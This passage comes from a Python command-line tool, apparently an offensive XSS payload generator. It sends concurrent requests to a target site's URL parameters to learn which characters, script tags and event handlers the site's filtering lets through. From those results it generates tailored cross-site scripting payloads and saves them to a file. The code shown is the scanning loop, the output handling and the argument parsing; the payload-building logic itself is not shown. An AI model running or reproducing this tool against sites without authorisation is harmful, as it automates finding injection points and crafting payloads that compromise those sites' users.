        connector = aiohttp.TCPConnector(
            limit=self.max_connections,
            ttl_dns_cache=300,
            enable_cleanup_closed=True
        )
        async with aiohttp.ClientSession(connector=connector) as session:
            sample_size = min(10, len(self.char_groups['basic']))
            sample_chars = list(self.char_groups['basic'])[:sample_size]
            initial_results = await asyncio.gather(*[
                self.test_single_char(url, param, char, session)
                for char in sample_chars
            ])
            if not any(initial_results):
                return ParamAnalysis(
                    param=param,
                    url=url,
                    allowed_chars=set(),
                    blocked_chars=set(),
                    max_length=None,
                    allows_spaces=False,
                    allows_quotes=False,
                    allows_angles=False,
                    allows_parens=False,
                    allows_scripts=False,
                    allows_events=False
                )
            batch_size = 20
            results = {}
            for group_name, chars in self.char_groups.items():
                chars_list = list(chars)
                for i in range(0, len(chars_list), batch_size):
                    batch = chars_list[i:i + batch_size]
                    batch_results = await asyncio.gather(*[
                        self.test_single_char(url, param, char, session)
                        for char in batch
                    ])
                    results.update(dict(zip(batch, batch_results)))
            allowed_chars = {char for char, allowed in results.items() if allowed}
            blocked_chars = {char for char, allowed in results.items() if not allowed}
            allows_scripts, allows_events, max_length = await asyncio.gather(
                self.quick_test_scripts(url, param),
                self.quick_test_events(url, param),
                self.quick_test_length(url, param)
            )
            return ParamAnalysis(
                param=param,
                url=url,
                allowed_chars=allowed_chars,
                blocked_chars=blocked_chars,
                max_length=max_length,
                allows_spaces=' ' in allowed_chars,
                allows_quotes='"' in allowed_chars or "'" in allowed_chars,
                allows_angles='<' in allowed_chars and '>' in allowed_chars,
                allows_parens='(' in allowed_chars and ')' in allowed_chars,
                allows_scripts=allows_scripts,
                allows_events=allows_events
            )

    async def analyze_url(self, url: str) -> Dict[str, List[str]]:
        try:
            params = self.extract_parameters(url)
            if not params:
                return {}
            results = {}
            for param in params:
                analysis = await self.analyze_parameter(url, param)
                if isinstance(analysis, ParamAnalysis):
                    payloads = self.generate_payloads(analysis)
                    if payloads:
                        results[analysis.param] = payloads
            return results
        except Exception as e:
            logging.error(f"Error analyzing {url}: {str(e)}")
            return {}

def remove_empty_lines(file_path: Path):
    try:
        with open(file_path, 'r') as file:
            lines = file.readlines()
        non_empty_lines = [line for line in lines if line.strip()]
        with open(file_path, 'w') as file:
            file.writelines(non_empty_lines)
    except Exception as e:
        logging.error(f"Error removing empty lines from {file_path}: {e}")

async def process_urls(
        urls: List[str],
        output_file: str,
        max_connections: int = DEFAULT_MAX_CONNECTIONS,
        batch_size: int = DEFAULT_BATCH_SIZE,
        headers: Dict[str, str] = None,
        ignored_urls: int = 0,
        char_file: Optional[str] = None
    ):
    BUFFER_SIZE = 8192
    SUMMARY_LINE_LENGTH = 30
    analyzer = None
    try:
        analyzer = XSSParamAnalyzer(
            max_connections=max_connections,
            batch_size=batch_size,
            output_file=output_file,
            headers=headers,
            char_file=char_file
        )
        await analyzer.init_session()
        total_chars = sum(len(chars) for chars in analyzer.char_groups.values())
        current_chars = 0
        results = {}
        start_time = time.time()
        total_payloads = 0
        unique_payloads = set()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        payloads_dir = Path('payloads')
        payloads_dir.mkdir(exist_ok=True)
        output_path = payloads_dir / f"{output_file}_{timestamp}.txt"
        print(f"{Fore.YELLOW}🕵️‍ Checking server characters allowance...{Style.RESET_ALL}")
        print()
        for url in urls:
            result = await analyzer.analyze_url(url)
            if result:
                results[url] = result
                for param_payloads in result.values():
                    total_payloads += len(param_payloads)
                    unique_payloads.update(param_payloads)
        print("\n\n", end='', flush=True)
        progress_bar = tqdm_asyncio(
            total=total_chars,
            desc="Progress",
            bar_format="{desc}: {percentage:3.0f}%|{bar}| [Characters: {n}/{total}] [Time:{elapsed}]",
            colour="red",
            dynamic_ncols=True,
            leave=True,
            initial=current_chars
        )
        while current_chars < total_chars:
            current_chars += 1
            progress_bar.update(1)
            await asyncio.sleep(0.01)
        progress_bar.close()
        try:
            with open(output_path, 'w', buffering=BUFFER_SIZE) as f:
                for payload in sorted(unique_payloads):
                    stripped_payload = payload.replace('\n', '').replace('\r', '').strip()
                    if stripped_payload:
                        f.write(f"{stripped_payload}\n")
            remove_empty_lines(output_path)
        except Exception as e:
            logging.error(f"Error writing to {output_path}: {e}")
        duration = int(time.time() - start_time)
        minutes, seconds = divmod(duration, 60)
        print("\n")
        print(f"{Fore.CYAN}🏁 Scan Complete! Summary:{Style.RESET_ALL}")
        print("=" * SUMMARY_LINE_LENGTH)
        print(f"Duration: {Fore.GREEN}{minutes}m {seconds}s{Style.RESET_ALL}")
        print(f"URLs processed: {Fore.GREEN}{len(urls)}{Style.RESET_ALL}")
        print(f"Total payloads generated: {Fore.GREEN}{total_payloads}{Style.RESET_ALL}")
        print(f"Unique payloads: {Fore.GREEN}{len(unique_payloads)}{Style.RESET_ALL}")
        print("=" * SUMMARY_LINE_LENGTH)
        print(f"\n{Fore.CYAN}📝 Results saved to:{Style.RESET_ALL} {Fore.GREEN}{str(output_path.absolute())}{Style.RESET_ALL}")
    except asyncio.CancelledError:
        if 'progress_bar' in locals():
            progress_bar.close()
        print("\n")
        print(f"{Fore.YELLOW}🚫 Scan interrupted by user{Style.RESET_ALL}")
    except Exception as e:
        if 'progress_bar' in locals():
            progress_bar.close()
        logging.error(f"Error during scan: {str(e)}")
        print(f"\n{Fore.RED}Error during scan: {str(e)}{Style.RESET_ALL}")
    finally:
        if analyzer and analyzer.session and not analyzer.session.closed:
            await analyzer.session.close()
            await asyncio.sleep(0.1)

def main():
    parser = argparse.ArgumentParser(
        description="",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False,
        usage='%(prog)s [-h HELP] [-d DOMAIN | -l URL_LIST] [-o OUTPUT] [-c CONNECTIONS] [-b BATCH_SIZE] [-H HEADER] [-u UPDATE]'
    )
    parser.add_argument('-h', '--help',
                      action='help',
                      help='Show this help message and exit')
    parser.add_argument('-u', '--update',
                      action='store_true',
                      help='Check for updates and automatically install the latest version')
    group = parser.add_mutually_exclusive_group(required=False)
    group.add_argument('-d', '--domain',
                      help='Specify the domain with parameter(s) to scan (required unless -l is used)',
                      metavar='')
    group.add_argument('-l', '--url-list',
                      help='Provide a file containing a list of URLs with parameters to scan (required unless -d is used)',
                      metavar='')
    parser.add_argument('-o', '--output',
                      default='xss_payloads_gen',
                      help='Specify the output file name',
                      metavar='')
    parser.add_argument('-c', '--connections',
                      type=int,
                      default=DEFAULT_MAX_CONNECTIONS,
                      help='Set the maximum number of concurrent connections',
                      metavar='')
    parser.add_argument('-b', '--batch-size',
                      type=int,
                      default=DEFAULT_BATCH_SIZE,
                      help='Define the number of requests per batch',
                      metavar='')
    parser.add_argument('-H', '--header',
                      action='append',
                      help='Custom headers can be specified multiple times. Format: "Header: Value"',
                      metavar='')
    parser.add_argument('-f', '--char-file',
                      help='Specify a file containing character groups to test',
                      metavar='')

    class CustomParser(argparse.ArgumentParser):
        def error(self, message):
            args = sys.argv[1:]
            if '-u' in args or '--update' in args:
                if len(args) == 1:
                    return
            self.print_help()
            if "one of the arguments -d/--domain -l/--url-list is required" in message:
                print(f"\n{Fore.RED}❌ One of the arguments is required: -d/--domain or -l/--url-list{Style.RESET_ALL}")
            sys.exit(2)

    parser.__class__ = CustomParser
    if len(sys.argv) == 1:
        parser.print_help()
        print(f"\n{Fore.RED}❌ One of the arguments is required: -d/--domain or -l/--url-list{Style.RESET_ALL}")
        sys.exit(2)
    args = parser.parse_args()
    if args.update:
        print(f"\n{Fore.CYAN}Checking for updates...{Style.RESET_ALL}")
        updater = AutoUpdater()
        if not updater.is_git_repo:
            print(f"{Fore.RED}Not a git repository. Cannot update.{Style.RESET_ALL}")
            sys.exit(1)
        has_changes, info = updater._get_remote_changes()
        if info == "Check skipped":
            print(f"{Fore.GREEN}Check skipped{Style.RESET_ALL}")
            sys.exit(0)
        elif not has_changes:
            print(f"{Fore.GREEN}Already at latest version{Style.RESET_ALL}")
            sys.exit(0)
        update_result = updater._perform_update()
        if update_result.get('status') == 'error':
            print(f"{Fore.RED}Update failed: {update_result.get('message')}{Style.RESET_ALL}")
            sys.exit(1)
        print(f"{Fore.GREEN}Tool updated successfully!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Please restart the tool to use the new version.{Style.RESET_ALL}")
        sys.exit(0)
    if not (args.domain or args.url_list):
        parser.print_help()
        print(f"\n{Fore.RED}❌ One of the arguments is required: -d/--domain or -l/--url-list{Style.RESET_ALL}")
        sys.exit(2)
    headers = {}
    if args.header:
        for header in args.header:
            try:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
            except ValueError:
                print(f"{Fore.RED}Invalid header format: {header}. Use 'Header: Value' format.{Style.RESET_ALL}")
                sys.exit(1)
    try:
        if args.domain:
            domain_url = args.domain.strip()
            if not domain_url.startswith(('http://', 'https://')):
                print(f"\n{Fore.RED}❌ Error: Invalid URL format.{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}🧩 URL must start with http:// or https://{Style.RESET_ALL}")
                print(f"{Fore.CYAN}🔗 Example of a valid URL: https://example.com/page?param1=value&param2=test{Style.RESET_ALL}")
                sys.exit(1)
            if '?' not in domain_url:
                print(f"\n{Fore.RED}❌ Error: The provided URL must contain at least one parameter.{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}🧩 Please ensure the URL includes at least one query parameter.{Style.RESET_ALL}")
                print(f"{Fore.CYAN}🔗 Example of a valid URL: https://example.com/page?param1=value&param2=test{Style.RESET_ALL}")
                sys.exit(1)
            parsed = urllib.parse.urlparse(domain_url)
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                print(f"\n{Fore.RED}❌ Error: The provided URL must contain at least one parameter.{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}🧩 Please ensure the URL includes at least one query parameter.{Style.RESET_ALL}")
                print(f"{Fore.CYAN}🔗 Example of a valid URL: https://example.com/page?param1=value&param2=test{Style.RESET_ALL}")
                sys.exit(1)
    except Exception as e:
        print(f"{Fore.RED}❌ Error: Unable to parse URL: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
    analyzer = XSSParamAnalyzer(
        max_connections=args.connections,
        batch_size=args.batch_size,
        output_file=args.output,
        headers=headers,
        char_file=args.char_file
    )
    analyzer.banner()
    urls = []
    ignored_urls = 0
    print(f"{Fore.CYAN}📦 Loading URLs...{Style.RESET_ALL}")
    if args.domain:
        urls = [domain_url]
        parsed = urllib.parse.urlparse(domain_url)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        param_count = len(params)
        param_word = "parameters" if param_count > 1 else "parameter"
        print(f"{Fore.GREEN}🔗 Loaded: 1 URL with {param_count} {param_word}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🔍 Starting the scan...{Style.RESET_ALL}")
    elif args.url_list:
        try:
            with open(args.url_list, 'r') as f:
                raw_urls = f.readlines()
            filtered_urls, no_params = filter_urls(raw_urls)
            urls = filtered_urls
            ignored_urls = no_params
            url_count = len(urls)
            if url_count > 0:
                print(f"{Fore.GREEN}🔗 Loaded: {url_count} URLs with parameters{Style.RESET_ALL}")
                if ignored_urls > 0:
                    print(f"{Fore.YELLOW}⚠️  Skipped: {ignored_urls} URLs without parameters{Style.RESET_ALL}")
                print(f"{Fore.CYAN}🔍 Starting the scan...{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}❌ No valid URLs with parameters found in the file{Style.RESET_ALL}")
                sys.exit(1)
        except FileNotFoundError:
            print(f"{Fore.RED}❌ Error: File not found: {args.url_list}{Style.RESET_ALL}")
            sys.exit(1)
        except Exception as e:
            print(f"{Fore.RED}❌ Error reading URL file: {str(e)}{Style.RESET_ALL}")
            sys.exit(1)
    asyncio.run(process_urls(
        urls=urls,
        output_file=args.output,
        max_connections=args.connections,
        batch_size=args.batch_size,
        headers=headers,
        ignored_urls=ignored_urls,
        char_file=args.char_file
    ))

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}🚫 Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}Unhandled exception: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
